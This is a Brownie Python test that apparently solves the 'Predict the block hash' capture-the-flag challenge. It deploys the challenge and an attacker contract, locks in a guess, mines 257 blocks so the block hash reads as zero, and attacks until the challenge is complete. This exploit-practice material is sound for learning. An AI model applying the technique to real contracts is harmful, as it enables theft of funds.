from brownie import (
    PredictTheFutureChallenge,
    FutureAttack,
    chain,
    PredictTheBlockHashChallenge,
    PredictAttack,
)
from eth_utils import to_bytes
from scripts.helpful_scripts import *
from web3 import Web3, eth

amount = Web3.toWei(1, "ether")


def test_predict():
    account = get_account()
    predict = PredictTheBlockHashChallenge.deploy({"from": account, "value": amount})
    attacker = PredictAttack.deploy(predict.address, {"from": account, "value": amount})
    attacker.lokcIn({"from": account})

    chain.mine(257)
    while predict.isComplete() == False:
        attacker.attack({"from": account})
    assert predict.isComplete() == True
